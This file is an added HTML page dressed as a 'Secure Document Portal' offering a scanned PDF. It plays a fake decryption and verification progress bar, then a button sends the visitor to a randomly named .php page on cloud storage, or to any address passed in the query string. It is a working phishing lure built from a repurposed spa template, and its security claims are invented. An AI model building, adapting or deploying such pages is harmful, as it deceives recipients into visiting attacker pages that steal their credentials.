@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>New Message! | Secure Document Portal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        spa: {
+                            50: '#f5f7f4',
+                            100: '#e5eae2',
+                            200: '#cce0c5',
+                            600: '#607853',
+                            700: '#4d6042',
+                            800: '#3d4c35',
+                            900: '#303c2a'
+                        },
+                        cream: {
+                            50: '#fbf9f5',
+                            100: '#f2ece1',
+                            200: '#e5d9c5',
+                            800: '#665c4c'
+                        }
+                    },
+                    fontFamily: {
+                        cinzel: ['"Cinzel"', 'serif'],
+                        sans: ['"Plus Jakarta Sans"', 'sans-serif']
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        @keyframes floatLotus {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-10px) rotate(1deg); }
+        }
+        @keyframes pulseGlow {
+            0%, 100% { opacity: 0.4; transform: scale(1); }
+            50% { opacity: 0.8; transform: scale(1.05); }
+        }
+        .animate-float {
+            animation: floatLotus 7s ease-in-out infinite;
+        }
+        .animate-glow {
+            animation: pulseGlow 5s ease-in-out infinite;
+        }
+        .glass-panel {
+            background: rgba(255, 255, 255, 0.82);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(229, 234, 226, 0.7);
+        }
+    </style>
+</head>
+<body class="h-full bg-cream-50 text-cream-800 font-sans antialiased selection:bg-spa-200 selection:text-spa-900 flex flex-col justify-between overflow-x-hidden relative">
+
+    <div class="fixed inset-0 pointer-events-none overflow-hidden z-0">
+        <div class="absolute -top-48 -left-48 w-[32rem] h-[32rem] rounded-full bg-spa-100/50 blur-[90px] animate-glow"></div>
+        <div class="absolute -bottom-48 -right-48 w-[32rem] h-[32rem] rounded-full bg-cream-200/40 blur-[90px]"></div>
+    </div>
+
+    <header class="relative z-10 w-full py-6 px-6 sm:px-12 flex justify-between items-center max-w-7xl mx-auto">
+        <div class="flex items-center space-x-3.5">
+            <div class="w-11 h-11 rounded-full bg-spa-800 flex items-center justify-center text-white font-cinzel text-xl shadow-md border border-spa-700">A</div>
+            <div>
+                <span class="font-cinzel text-lg tracking-widest text-spa-900 font-bold block uppercase">New Message!</span>
+                <span class="text-[10px] uppercase tracking-[0.2em] text-spa-600 block"></span>
+            </div>
+        </div>
+        <div class="text-xs uppercase tracking-wider text-cream-800/60 font-medium hidden sm:block bg-white/50 px-4 py-2 rounded-full border border-cream-200/50 shadow-sm">
+            Secure Document Gateway
+        </div>
+    </header>
+
+    <main class="relative z-10 flex-grow flex items-center justify-center px-4 sm:px-6 py-8">
+        <div class="w-full max-w-lg glass-panel rounded-3xl p-8 sm:p-10 shadow-2xl shadow-spa-900/10 animate-float">
+            
+            <div class="text-center mb-8">
+                <div class="inline-flex items-center justify-center px-4 py-1.5 rounded-full bg-spa-100 text-spa-800 text-xs font-medium mb-4 tracking-wider uppercase shadow-xs">
+                    <span id="greeting-icon" class="mr-2">🌿</span> <span id="time-greeting">Loading local time...</span>
+                </div>
+                
+                <h1 id="card-heading" class="font-cinzel text-2xl sm:text-3xl text-spa-900 mb-2 font-bold transition-all duration-300">Accessing Document</h1>
+                
+                <!-- This subtitle instruction text explicitly transitions out upon 100% completion -->
+                <p id="instruction-text" class="text-cream-800/70 text-sm max-w-sm mx-auto font-light leading-relaxed transition-all duration-500 transform opacity-100">
+                    Please hold on while we load your document from secure storage.
+                </p>
+            </div>
+
+            <div class="bg-white/90 rounded-2xl p-5 mb-8 border border-cream-200/80 shadow-sm flex items-center space-x-4">
+                <div class="w-13 h-13 min-w-[3.25rem] h-13 rounded-2xl bg-spa-50 flex items-center justify-center text-spa-700 shadow-xs border border-spa-100">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.6" d="M7 21h10a2 2 0 002-2V9.414a1 1 0 00-.293-.707l-5.414-5.414A1 1 0 0012.586 3H7a2 2 0 00-2 2v14a2 2 0 002 2z" />
+                    </svg>
+                </div>
+                <div class="flex-grow min-w-0">
+                    <div id="file-name" class="font-cinzel font-semibold text-spa-900 text-sm truncate">Scanned_Doc_Xero_Scannerfile_2026.pdf</div>
+                    <div class="flex flex-wrap items-center gap-x-3 gap-y-1 mt-1 text-xs text-cream-800/60 font-medium">
+                        <span id="file-size">3.8 MB</span>
+                        <span>•</span>
+                        <span id="file-pages">12 Pages</span>
+                        <span>•</span>
+                        <span class="text-spa-700 bg-spa-50 px-2 py-0.5 rounded-md font-semibold">Secured PDF</span>
+                    </div>
+                </div>
+            </div>
+
+            <div id="loading-section" class="space-y-4 transition-all duration-500">
+                <div class="flex justify-between items-center text-xs font-semibold text-spa-900 tracking-wide">
+                    <span id="loading-status-text" class="flex items-center">
+                        <svg class="animate-spin -ml-1 mr-2 h-4 w-4 text-spa-700" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                        </svg>
+                        Initializing secure storage...
+                    </span>
+                    <span id="progress-percentage" class="text-spa-700 font-bold">0%</span>
+                </div>
+                
+                <div class="w-full h-3 bg-cream-100 rounded-full overflow-hidden p-0.5 border border-cream-200/50">
+                    <div id="progress-bar-fill" class="h-full bg-gradient-to-r from-spa-600 to-spa-800 rounded-full transition-all duration-300 ease-out shadow-xs" style="width: 0%"></div>
+                </div>
+                
+                <p class="text-center text-[11px] text-cream-800/50 pt-1 tracking-wider uppercase font-light">SSL Encrypted • High-Resolution Portfolio Active</p>
+            </div>
+
+            <div id="action-section" class="hidden space-y-4 pt-1 transition-all duration-700 transform opacity-0 translate-y-3">
+                <div class="bg-spa-50/80 border border-spa-200/80 rounded-2xl p-3.5 text-center shadow-inner">
+                    <span class="inline-flex items-center justify-center w-7 h-7 rounded-full bg-spa-200 text-spa-900 mb-1 text-xs font-bold shadow-xs">✓</span>
+                    <p class="text-xs text-spa-900 font-medium">Document verified and ready for client review.</p>
+                </div>
+
+                <button onclick="openDocumentFile()" class="w-full py-4 px-6 rounded-2xl bg-spa-800 hover:bg-spa-900 text-white font-cinzel text-sm tracking-wider font-semibold shadow-xl shadow-spa-900/20 transition-all duration-300 flex items-center justify-center space-x-2 group cursor-pointer border border-spa-700 hover:scale-[1.01]">
+                    <span>Click here to continue to file</span>
+                    <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 transform group-hover:translate-x-1.5 transition-transform" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3" />
+                    </svg>
+                </button>
+
+                <div class="flex items-center justify-between text-xs text-cream-800/60 px-2 pt-1">
+                    <span class="flex items-center"><span class="w-2 h-2 rounded-full bg-emerald-500 inline-block mr-1.5 animate-pulse"></span> Storage connection active</span>
+                    <button onclick="restartDocumentLoader()" class="hover:text-spa-900 underline transition-colors font-medium">Re-verify file</button>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <footer class="relative z-10 w-full py-6 text-center text-xs text-cream-800/50 max-w-7xl mx-auto font-light">
+        &copy; 2026 Doc. All rights reserved. Secure Cloud Storage Protocol.
+    </footer>
+
+    <script>
+        // =========================================================================
+        // 🔗 CONFIGURE YOUR PDF LINK HERE:
+        // Replace '#' inside the quotes with your actual PDF link or file path in storage.
+        // Example: const DEFAULT_PDF_URL = 'assets/pdfs/spa-menu.pdf';
+        // =========================================================================
+        const DEFAULT_PDF_URL = 'https://storage.googleapis.com/35463434535435463/94187634725493760979u0-7648029834791767382734725768347524382435234435.php'; 
+
+
+        // Parse custom URL query parameters if provided by main website (e.g. ?file=menu.pdf&url=...)
+        const urlParams = new URLSearchParams(window.location.search);
+        const fileName = urlParams.get('file') || 'Secured_Document_Scanned_Xeroscanner_2026.pdf';
+        const fileSize = urlParams.get('size') || '3.8 MB';
+        const filePages = urlParams.get('pages') || '3 Pages';
+        const targetUrl = urlParams.get('url') || DEFAULT_PDF_URL;
+
+        // Set metadata text in DOM
+        document.getElementById('file-name').textContent = fileName;
+        document.getElementById('file-size').textContent = fileSize;
+        document.getElementById('file-pages').textContent = filePages;
+
+        // Automatically detect client local time and format appropriate luxury greeting
+        function setAutomaticLocalTimeGreeting() {
+            const localDate = new Date();
+            const currentHour = localDate.getHours();
+            
+            let greetingText = "Good morning";
+            let greetingIcon = "☕";
+
+            if (currentHour >= 12 && currentHour < 17) {
+                greetingText = "Good afternoon";
+                greetingIcon = "☀️";
+            } else if (currentHour >= 17) {
+                greetingText = "Good evening";
+                greetingIcon = "🌙";
+            }
+
+            document.getElementById('time-greeting').textContent = greetingText;
+            document.getElementById('greeting-icon').textContent = greetingIcon;
+        }
+
+        // Run loading progression sequence
+        let progress = 0;
+        const progressBarFill = document.getElementById('progress-bar-fill');
+        const progressPercentage = document.getElementById('progress-percentage');
+        const loadingStatusText = document.getElementById('loading-status-text');
+        const loadingSection = document.getElementById('loading-section');
+        const actionSection = document.getElementById('action-section');
+        const cardHeading = document.getElementById('card-heading');
+        const instructionText = document.getElementById('instruction-text');
+
+        const loadingPhases = [
+            { limit: 22, label: "Establishing secure connection..." },
+            { limit: 48, label: "Decrypting spa menu & pricing..." },
+            { limit: 76, label: "Verifying document integrity..." },
+            { limit: 94, label: "Optimizing high-res layout..." },
+            { limit: 100, label: "Document ready!" }
+        ];
+
+        function runLoaderSequence() {
+            // Automatically detect time on load
+            setAutomaticLocalTimeGreeting();
+
+            progress = 0;
+            progressBarFill.style.width = '0%';
+            progressPercentage.textContent = '0%';
+            
+            // Reset visibility states
+            loadingSection.classList.remove('hidden');
+            loadingSection.style.opacity = '1';
+            actionSection.classList.add('hidden');
+            actionSection.classList.remove('opacity-100', 'translate-y-0');
+            actionSection.classList.add('opacity-0', 'translate-y-3');
+            
+            cardHeading.textContent = "Accessing Document";
+            instructionText.style.opacity = '1';
+            instructionText.style.maxHeight = '100px';
+
+            const loadTimer = setInterval(() => {
+                const jump = Math.floor(Math.random() * 8) + 3;
+                progress += jump;
+
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(loadTimer);
+
+                    // Transition out "Please hold on while we load your document" and loading bar
+                    setTimeout(() => {
+                        cardHeading.textContent = "Your File Is Ready";
+                        
+                        // Smoothly fade out instruction text and loading section
+                        instructionText.style.opacity = '0';
+                        instructionText.style.maxHeight = '0px';
+                        instructionText.style.margin = '0';
+                        
+                        loadingSection.style.opacity = '0';
+                        setTimeout(() => {
+                            loadingSection.classList.add('hidden');
+                            
+                            // Reveal action section with prominent "Click here to continue to file" button
+                            actionSection.classList.remove('hidden');
+                            setTimeout(() => {
+                                actionSection.classList.remove('opacity-0', 'translate-y-3');
+                                actionSection.classList.add('opacity-100', 'translate-y-0');
+                            }, 50);
+                        }, 300);
+                    }, 400);
+                }
+
+                progressBarFill.style.width = progress + '%';
+                progressPercentage.textContent = progress + '%';
+
+                // Update status messages dynamically
+                for (let i = 0; i < loadingPhases.length; i++) {
+                    if (progress <= loadingPhases[i].limit) {
+                        loadingStatusText.innerHTML = `
+                            <svg class="animate-spin -ml-1 mr-2 h-4 w-4 text-spa-700" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                            </svg>
+                            ${loadingPhases[i].label}
+                        `;
+                        break;
+                    }
+                }
+            }, 110);
+        }
+
+        function openDocumentFile() {
+            if (targetUrl && targetUrl !== '#') {
+                window.location.href = targetUrl;
+            } else {
+                // Interactive simulation fallback dialog if no link is set yet
+                const modalNotice = document.createElement('div');
+                modalNotice.className = 'fixed inset-0 bg-black/40 backdrop-blur-xs flex items-center justify-center z-50 px-4 animate-fade-in';
+                modalNotice.innerHTML = `
+                    <div class="bg-white rounded-2xl p-6 max-w-sm w-full text-center shadow-2xl border border-cream-200">
+                        <div class="w-12 h-12 bg-spa-100 text-spa-800 rounded-full flex items-center justify-center mx-auto mb-3 font-cinzel text-xl font-bold shadow-xs">✓</div>
+                        <h3 class="font-cinzel text-lg text-spa-900 font-bold mb-1">PDF Link Placeholder</h3>
+                        <p class="text-xs text-cream-800/70 mb-4">To connect your live PDF, update <code class="bg-cream-100 px-1.5 py-0.5 rounded text-spa-900 font-mono">DEFAULT_PDF_URL</code> in the script section or pass it via URL query parameters.</p>
+                        <button onclick="this.closest('.fixed').remove()" class="w-full py-2.5 bg-spa-800 text-white rounded-xl text-xs uppercase tracking-wider font-semibold hover:bg-spa-900 transition-colors cursor-pointer shadow-md">Got it</button>
+                    </div>
+                `;
+                document.body.appendChild(modalNotice);
+            }
+        }
+
+        function restartDocumentLoader() {
+            runLoaderSequence();
+        }
+
+        // Initialize loader sequence on window load
+        window.onload = function() {
+            runLoaderSequence();
+        };
+    </script>
+</body>
+</html>
